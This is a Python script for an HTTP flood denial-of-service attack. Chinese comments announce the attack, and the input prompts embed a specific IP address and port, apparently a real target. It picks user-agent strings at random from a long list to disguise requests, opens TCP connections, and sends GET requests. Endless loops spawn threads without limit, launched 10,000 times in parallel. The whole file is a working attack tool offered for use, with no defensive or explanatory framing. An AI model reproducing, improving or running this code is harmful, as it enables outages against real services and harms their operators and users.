import socket
import os
import random
import pyfiglet
import threading
import time
from termcolor import colored

target_ip = input("45.205.29.247: ")
target_port = int(input("884: "))

# 显示攻击开始的信息
print(f"攻击开始，目标IP: {target_ip}，端口: {target_port}")
time.sleep(1)

# 模拟攻击过程
print("攻击进行中...")
# 这里可以添加实际的攻击逻辑，例如发送数据包、扫描端口等

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.3",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; OPPO Reno 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; OPPO Reno 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3081) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 8.1.0; Vertu Signature Cobra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Goldvish Le Million) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Gresso Luxor Las Vegas Jackpot) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
    "Mozilla/5.0 (Linux; Android 10; Huawei Mate X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Mobile; LYF/F120B/LYF-F120B-000-01-25-070918; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
    "Mozilla/5.0 (Mobile; Nokia 8110 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
    "Mozilla/5.0 (WebOS; LG Smart TV; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/538.2 WebAppManager",
    "Mozilla/5.0 (Linux; U; Android 9; BRAVIA 4K GB ATV3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 9; BRAVIA 4K GB ATV3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 TV Safari/537.36",
    "Mozilla/5.0 (AppleTV; U; CPU OS 13_4 like Mac OS X; en-us) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; moto g play (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia 1.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A022F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-M022G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; BLU G91) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; 5002D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; Connected Modular 45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; Tambour Horizon) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0; Hublot Big Bang E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0; Summit 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
    "Mozilla/5.0 (Apple Watch; CPU WatchOS 8_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/8.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.0; Exospace B55) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Connected Calibre E4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Tesla/feature-2022.20.9-31-abc",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0 Kali Linux",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Arch Linux",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0 Red Hat",
    "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0 Parrot OS"
]

def launch_attack(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        user_agent = random.choice(user_agents)
        s.send(f"GET / HTTP/1.1\r\nUser-Agent: {user_agent}\r\n\r\n".encode())
        print(f"Connection established with {target_ip}:{target_port} and User-Agent: {user_agent}")
    except socket.error:
        print(f"Connection error with {target_ip}:{target_port}")

def dos_attack():
    while True:
        threading.Thread(target=launch_attack, args=(target_ip, target_port)).start()

if __name__ == "__main__":
    for _ in range(10000):
        threading.Thread(target=dos_attack).start()
